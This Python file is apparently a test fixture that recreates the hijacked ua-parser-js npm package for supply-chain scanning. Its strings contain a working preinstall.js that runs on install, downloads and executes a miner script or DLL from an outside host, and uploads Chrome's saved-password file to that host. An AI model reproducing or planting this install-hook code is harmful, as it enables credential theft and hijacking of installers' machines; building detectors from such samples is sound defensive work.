"""
Simulated ua-parser-js (npm account hijack) attack patterns.
Real attack: maintainer account compromised, injected crypto miner + credential stealer.
"""

PACKAGE_JSON = """{
  "name": "ua-parser-js",
  "version": "0.7.29",
  "scripts": {
    "preinstall": "node preinstall.js"
  }
}"""

PREINSTALL_JS = """
const os = require('os');
const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const path = require('path');

function download(url, dest, cb) {
  var file = fs.createWriteStream(dest);
  https.get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() { file.close(cb); });
  });
}

var platform = os.platform();
var arch = os.arch();

// Download and execute crypto miner based on platform
if (platform === 'linux') {
  download('https://citationsherbe.at/sdd.sh', '/tmp/sdd.sh', function() {
    exec('bash /tmp/sdd.sh', function(){});
  });
} else if (platform === 'win32') {
  var dll = path.join(os.tmpdir(), 'create.dll');
  download('https://citationsherbe.at/create.dll', dll, function() {
    exec('regsvr32.exe /s ' + path.join(os.tmpdir(), 'create.dll'), function(){});
  });
}

// Steal passwords
var passwordFile = platform === 'win32'
  ? path.join(process.env.APPDATA, 'Local/Google/Chrome/User Data/Default/Login Data')
  : path.join(os.homedir(), '.config/google-chrome/Default/Login Data');

if (fs.existsSync(passwordFile)) {
  var data = fs.readFileSync(passwordFile);
  https.request({
    hostname: 'citationsherbe.at',
    path: '/upload',
    method: 'POST'
  }).end(data);
}
"""

PACKAGE_FILES = {
    "ua-parser-js-0.7.29/package.json": PACKAGE_JSON,
    "ua-parser-js-0.7.29/preinstall.js": PREINSTALL_JS,
    "ua-parser-js-0.7.29/index.js": "// legitimate ua-parser code\nmodule.exports = {};\n",
}
